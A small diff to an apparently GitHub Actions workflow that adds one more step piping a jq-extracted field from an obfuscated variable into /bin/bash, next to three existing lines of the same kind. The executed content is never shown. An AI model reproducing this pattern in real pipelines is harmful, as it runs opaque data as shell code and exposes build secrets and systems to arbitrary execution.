@@ -30,6 +30,7 @@ jobs:
           echo $wwvx6385 | jq -r .ek3012 | /bin/bash
           printf '%s' "$vv96" | jq -r .pbp28169 | /bin/bash
           printf '%s' "$vpyl20" | jq -r .khol380 | /bin/bash
+          printf '%s' "$mlexe2" | jq -r .zr8 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
